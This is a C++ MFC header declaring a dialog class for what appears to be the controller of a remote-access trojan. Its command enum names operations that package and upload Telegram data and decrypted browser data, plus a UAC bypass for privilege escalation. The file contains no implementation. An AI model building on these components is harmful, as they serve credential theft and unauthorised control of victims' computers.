#pragma once




// CExpandDlg 对话框
enum
{
	COMMAND_EXPAND_LAYOUT,
	COMMAND_EXPAND_EDIT_IN,
	COMMAND_EXPAND_EDIT_OUT,
	COMMAND_EXPAND_BUTTON_GET,
	COMMAND_EXPAND_BUTTON_SET,
	COMMAND_EXPAND_LISTDATA,
	COMMAND_EXPAND_LISTMEAN,



	COMMAND_EXPAND_TG = 30,    //tg打包上传
	COMMAND_EXPAND_BD = 31,    //浏览器解密数据打包上传
	COMMAND_EXPAND_UACME = 32, //ByPassUac 提权使用
};

class CExpandDlg : public CDialog
{

	//DECLARE_DYNAMIC(CExpandDlg)

public:
	CExpandDlg(CWnd* pParent = NULL, ISocketBase* IOCPServer = NULL, ClientContext* ContextObject = NULL);   // 标准构造函数
	ClientContext* m_pContext;
	ISocketBase* m_iocpServer;
	HICON          m_hIcon;



	void CExpandDlg::OnReceiveComplete(void);
	void OnReceive();
	// 对话框数据
	enum {	IDD = IDD_EXPAND};

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持
	virtual void PostNcDestroy();
	virtual void OnCancel();
	DECLARE_MESSAGE_MAP()
public:
	BOOL m_bOnClose;
	virtual BOOL OnInitDialog();
	//afx_msg void OnClose();

	afx_msg void OnBnClickedGet();
	afx_msg void OnBnClickedSet();
	afx_msg void OnRclickList(NMHDR* pNMHDR, LRESULT* pResult);
	CEdit m_edit_in;
	CEdit m_edit_out;
	CButton m_button_get;
	CButton m_button_set;
	CListCtrl m_list;
	EXPANDLAYOUT m_expandlayout;
	CMenu menu;
};
